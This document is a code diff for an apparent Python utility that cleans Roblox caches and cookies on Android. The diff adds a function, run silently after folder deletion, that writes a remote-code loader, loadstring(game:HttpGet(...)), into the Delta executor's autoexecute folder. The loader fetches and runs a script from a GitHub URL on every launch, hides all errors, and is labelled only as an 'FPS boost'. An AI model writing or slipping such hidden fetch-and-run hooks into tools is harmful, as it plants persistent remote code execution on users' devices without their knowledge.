@@ -802,6 +802,22 @@ def edit_lite(package_name):
     except Exception as e:
         print(Fore.RED + f"An error occurred during the edit_lite process for package {package_name}: {e}" + Style.RESET_ALL)
 
+def create_fps_file():
+    try:
+        directory = "/storage/emulated/0/Delta/Autoexecute"
+        
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+        
+        file_path = os.path.join(directory, "XeroHub_FpsBoost.txt")
+        
+        with open(file_path, "w") as file:
+            file.write('loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/FPS%20Boost"))()')
+        pass
+    
+    except Exception as e:
+        pass
+
 def delete_cache(package_name):
     try:
         cache_dir = f"/data/data/{package_name}/cache"
@@ -871,6 +887,9 @@ def delete_folders_from_all_packages():
 
         print(Fore.GREEN + "Folder deletion completed for all packages." + Style.RESET_ALL)
 
+        # Sau khi hoàn thành việc xóa, tạo FPS.txt
+        create_fps_file()
+
     elif user_input.isdigit():
         package_idx = int(user_input) - 1
         if 0 <= package_idx < len(packages):
@@ -879,6 +898,10 @@ def delete_folders_from_all_packages():
                 print(Fore.YELLOW + f"Deleting folders and cache for {package_name}..." + Style.RESET_ALL)
                 delete_folders_and_cache(package_name)
                 print(Fore.GREEN + f"Folder deletion completed for {package_name}." + Style.RESET_ALL)
+
+                # Sau khi hoàn thành việc xóa, tạo FPS.txt
+                create_fps_file()
+
             except Exception as e:
                 print(Fore.RED + f"Error deleting folders and cache for {package_name}: {e}" + Style.RESET_ALL)
         else:
@@ -918,7 +941,6 @@ def delete_cookie_from_storage(package_name):
                 os.remove(appstorage_file_path)
                 print(Fore.GREEN + f"Deleted appStorage file from {destination_appstorage_dir}" + Style.RESET_ALL)
 
-        # Xoá thư mục cache sau khi xoá cookie
         delete_cache(package_name)
 
     except Exception as e:
@@ -988,7 +1010,7 @@ def main():
             "Automatically Same Hwid For Fluxus",   
             "Automatically Send Webhook",    
             "Automatically Log Out Of Account In Roblox",  
-            "Reduce 15% Of Graphics For Roblox",  
+            "Reduce 40% Of Graphics For Roblox",  
             "List",  
             "Exit"
         ]
